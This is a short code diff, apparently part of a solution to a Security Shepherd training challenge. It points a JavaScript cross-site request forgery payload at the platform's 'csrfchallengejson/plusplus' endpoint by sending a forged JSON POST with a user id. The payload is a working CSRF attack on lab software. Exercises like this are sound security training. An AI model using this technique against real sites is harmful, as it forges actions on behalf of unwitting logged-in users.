@@ -3,7 +3,7 @@
 <script>
 function put() {
     var x = new XMLHttpRequest();
-    x.open("POST","/user/csrfchallengejson/plusplus",true);
+    x.open("POST","https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengejson/plusplus",true);
     x.setRequestHeader("Content-Type", "application/json");
     x.send(JSON.stringify({"userid":"d35874530d87a07ad3cd5864affdf5736743f5ad"})); 
 }
